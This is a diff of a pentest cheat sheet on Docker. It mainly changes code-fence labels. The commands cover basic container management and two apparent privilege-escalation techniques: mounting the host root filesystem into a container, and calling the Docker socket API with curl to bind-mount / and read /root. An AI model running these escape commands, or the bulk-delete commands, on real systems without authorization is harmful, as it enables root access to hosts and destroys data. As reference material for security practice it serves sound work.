@@ -4,57 +4,56 @@ date: 2024-7-3
 tags: ["docker", "privesc", "container", "escape", "dive"]
 ---
 
----
 ### Basic Commands
 
 <div>
 
-```bash
+```console
 # Show all running processes
 sudo docker ps -a
 ```
 
-```bash
+```console
 # Show all images
 sudo docker images -a
 ```
 
-```bash
+```console
 # Stop all processes
 sudo docker stop $(sudo docker ps -a -q)
 ```
 
-```bash
+```console
 # Remove all processes
 sudo docker rm -vf $(sudo docker ps -a -q)
 ```
 
-```bash
+```console
 # Remove all images
 sudo docker rmi -f $(sudo docker images -aq)
 ```
 
-```bash
+```console
 # Shell in docker
 sudo docker exec -it <CONTAINER_NAME> sh
 ```
 
-```bash
+```console
 # Copy file from host to container
 sudo docker cp <HOST_FILE_PATH> <CONTAINER_ID>:<CONTAINER_FILE_PATH>
 ```
 
-```bash
+```console
 # Copy file from container to host
 sudo docker cp <CONTAINER_ID>:<CONTAINER_FILE_PATH> <HOST_FILE_PATH>
 ```
 
-```bash
+```console
 # Copy folder from host to container
 sudo docker cp <HOST_FOLDER_PATH>/. <CONTAINER_ID>:<CONTAINER_TARGET_PATH>
 ```
 
-```bash
+```console
 # Copy folder from container to host
 sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>
 ```
@@ -72,7 +71,7 @@ sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>
 
 <div>
 
-```bash
+```console
 dive docker-archive://image.tar
 ```
 
@@ -90,17 +89,17 @@ dive docker-archive://image.tar
 
 <div>
 
-```bash
+```console
 # List images
 docker images
 ```
 
-```bash
+```console
 # Mount host root filesystem
 docker run -v /:/mnt -it <IMAGE_NAME> bash
 ```
 
-```bash
+```console
 # Check
 ls /mnt/root
 ```
@@ -115,22 +114,22 @@ ls /mnt/root
 
 <div>
 
-```bash
+```console
 # Show running containers
 curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
 
-```bash
+```console
 # Create container
 curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<IMAGE_NAME>:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create
 ```
 
-```bash
+```console
 # Start container
 curl -s -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/<CONTAINER_ID>/start
 ```
 
-```bash
+```console
 # Show results
 curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<CONTAINER_ID>/logs?stderr=1&stdout=1"
 ```
